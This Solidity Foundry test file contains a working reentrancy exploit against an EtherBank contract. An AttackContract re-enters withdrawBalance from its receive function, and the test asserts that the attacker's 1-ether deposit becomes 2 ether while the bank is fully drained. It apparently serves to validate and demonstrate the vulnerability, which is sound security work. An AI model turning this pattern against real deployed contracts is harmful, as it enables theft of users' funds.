// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/etherbank.sol";

contract AttackContract {
    EtherBank public immutable bank;
    bool private reentered;

    constructor(EtherBank _bank) {
        bank = _bank;
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            bank.withdrawBalance();
        }
    }

    function attack() public {
        bank.withdrawBalance();
    }
}

contract EtherBankTest is Test {
    EtherBank public bank;
    AttackContract public attacker;
    address public helper = makeAddr("helper");

    function setUp() public {
        bank = new EtherBank();
        attacker = new AttackContract(bank);

        vm.deal(helper, 1 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyVulnerability() public {
        // Helper deposits 1 ether
        vm.prank(helper);
        bank.addToBalance{value: 1 ether}();

        // Attacker deposits 1 ether using their own ETH balance
        vm.prank(address(attacker));
        bank.addToBalance{value: 1 ether}();

        // Pre-attack checks
        assertEq(address(bank).balance, 2 ether, "Bank balance should be 2 ether");
        assertEq(bank.getBalance(address(attacker)), 1 ether, "Attacker bank balance should be 1 ether");
        assertEq(address(attacker).balance, 0, "Attacker ETH balance should be 0 after deposit");

        // ================= Differential Validation Start =================
        console.log("\n--- BEFORE-Trigger State Snapshot ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBankBalanceBefore = bank.getBalance(address(attacker));
        uint256 attackerETHBalanceBefore = address(attacker).balance;
        uint256 totalWithdrawalsBefore = bank.totalWithdrawals();

        console.log("Bank ETH Balance (before):         %s", bankBalanceBefore);
        console.log("Attacker's Bank Balance (before):  %s", attackerBankBalanceBefore);
        console.log("Attacker's ETH Balance (before):   %s", attackerETHBalanceBefore);
        console.log("Total Withdrawals (before):        %s", totalWithdrawalsBefore);

        console.log("\n--- Trigger Attack ---");
        attacker.attack();

        console.log("\n--- AFTER-Trigger State Snapshot ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBankBalanceAfter = bank.getBalance(address(attacker));
        uint256 attackerETHBalanceAfter = address(attacker).balance;
        uint256 totalWithdrawalsAfter = bank.totalWithdrawals();

        console.log("Bank ETH Balance (after):          %s", bankBalanceAfter);
        console.log("Attacker's Bank Balance (after):   %s", attackerBankBalanceAfter);
        console.log("Attacker's ETH Balance (after):    %s", attackerETHBalanceAfter);
        console.log("Total Withdrawals (after):         %s", totalWithdrawalsAfter);

        // Check if the reentrancy attack succeeded
        bool vulnerabilityExploited = (attackerETHBalanceAfter == 2 ether && 
                                      bankBalanceAfter == 0 && 
                                      attackerBankBalanceAfter == 0);
        
        console.log("\n--- Differential Result ---");
        console.log("ETH stolen (2 ether expected):     %s", attackerETHBalanceAfter);
        console.log("Bank drained (0 ether expected):   %s", bankBalanceAfter);
        console.log("Attacker bank balance reset (0):   %s", attackerBankBalanceAfter);
        console.log("Withdrawals increase:              %s -> %s (+%s)", 
                    totalWithdrawalsBefore, totalWithdrawalsAfter, 
                    totalWithdrawalsAfter - totalWithdrawalsBefore);

        if (vulnerabilityExploited) {
            console.log("Exploitation Status:             SUCCESSFUL");
            console.log("Vulnerability Exists: Reentrancy attack drained bank contract");
        } else {
            console.log("Exploitation Status:             FAILED");
            console.log("Vulnerability not Exist: Reentrancy conditions not met");
        }
        // ================= Differential Validation End =================

        // Post-attack checks
        console.log("\nAttacker final balance: %s", address(attacker).balance);
        assertEq(address(attacker).balance, 2 ether, "Attacker should have stolen 2 ether");
        assertEq(address(bank).balance, 0, "Bank should be completely drained");
        assertEq(bank.getBalance(address(attacker)), 0, "Attacker's bank balance should be zeroed");
    }
}